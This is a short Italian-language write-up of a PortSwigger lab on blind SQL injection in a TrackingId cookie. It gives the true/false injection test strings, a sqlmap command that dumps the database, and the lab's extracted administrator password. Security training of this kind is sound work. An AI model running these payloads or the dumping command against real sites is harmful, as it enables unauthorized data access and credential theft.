# cyberSec-Labs
appunti e esercizi di WEB Security Academy
# 🛡️ PortSwigger Lab: Blind SQL Injection

## Obiettivo
Estrarre la password dell'utente `administrator` tramite una Blind SQL Injection nel cookie `TrackingId`.

## Strumenti utilizzati
* **Burp Suite Professional** (Intruder & Repeater)
* **sqlmap** (Automazione tramite WSL)

## Procedura
1. **Analisi manuale:** Ho verificato che aggiungendo `' AND '1'='1` al cookie `TrackingId`, la pagina mostrava "Welcome back", mentre con `' AND '1'='2` la scritta spariva.
2. **Automazione con sqlmap:** Ho utilizzato il seguente comando per estrarre il database:

python3 sqlmap.py -u "https://TUO-ID-LAB.net/" --cookie="TrackingId=...; session=..." --level=2 -p TrackingId --dump

## Risultato Finale
Sono riuscito a scaricare la tabella utenti e ottenere le credenziali:
| Username | Password |
| :--- | :--- |
| administrator | harxxm21zd62cbo06jkv |
